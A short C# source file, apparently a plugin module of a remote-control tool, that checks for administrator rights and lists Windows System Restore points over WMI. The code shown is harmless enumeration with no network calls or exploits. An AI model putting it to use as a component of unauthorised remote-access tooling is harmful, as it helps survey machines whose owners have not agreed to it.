using PacketLib.Packet;
using System.Collections.Generic;
using System.Management;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class GetRestorePoints
    {
        internal static List<RestorePoint> GetAllRestorePoints() 
        {
            if (!Utils.IsAdmin())
                return null;

            ManagementClass objClass = new ManagementClass("\\\\.\\root\\default", "systemrestore", new System.Management.ObjectGetOptions());
            ManagementObjectCollection objCol = objClass.GetInstances();
            List<RestorePoint> restorepoints = new List<RestorePoint>();
            foreach (ManagementObject objItem in objCol)
            {
                restorepoints.Add(new RestorePoint
                {
                    index = (uint)objItem["sequencenumber"],
                    description = objItem["description"].ToString(),
                    type = (RestorePoint.RestorePointType)((uint)objItem["restorepointtype"]),
                    creationTime = objItem["creationtime"].ToString()
                });
            }
            return restorepoints;
        }
    }
}
